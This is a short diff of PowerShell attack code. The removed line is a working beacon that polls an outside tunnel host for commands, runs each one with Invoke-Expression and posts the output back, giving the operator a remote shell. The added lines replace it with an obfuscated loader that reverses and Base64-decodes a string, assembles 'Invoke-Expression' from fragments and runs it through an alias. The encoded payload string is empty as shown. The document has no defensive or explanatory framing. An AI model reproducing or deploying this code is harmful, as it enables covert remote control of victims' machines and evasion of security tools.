@@ -1,1 +1,5 @@
-$s='wide-paths-allow.loca.lt';$i='e04cd6c6-4cb2010b-c6313a2c';$p='https://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/e04cd6c6 -Headers @{"X-8f5a-8c23"=$i;"Bypass-Tunnel-Reminder"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/4cb2010b -Headers @{"X-8f5a-8c23"=$i;"Bypass-Tunnel-Reminder"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/c6313a2c -Method POST -Headers @{"X-8f5a-8c23"=$i;"Bypass-Tunnel-Reminder"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
+$xTdMlX = "" ;
+$TdlMyhWLNtQfBxV2FwRgC = $xTdMlX.ToCharArray() ; [array]::Reverse($TdlMyhWLNtQfBxV2FwRgC) ; -join $TdlMyhWLNtQfBxV2FwRgC 2>&1> $null ;
+$s5g41oJtdarMSyukGVziKWT = [SyStEM.tExt.enCODiNg]::Utf8.getStrINg([SYSTEm.ConvErT]::FROmBase64strINg("$TdlMyhWLNtQfBxV2FwRgC")) ;
+$wvjGuTcy = "InV"+"Oke"+"-Ex"+"pRE"+"SsI"+"ON" ; NEW-aLIAS -NamE pwN -VaLue $wvjGuTcy -fORce ; PwN $s5g41oJtdarMSyukGVziKWT ;
+
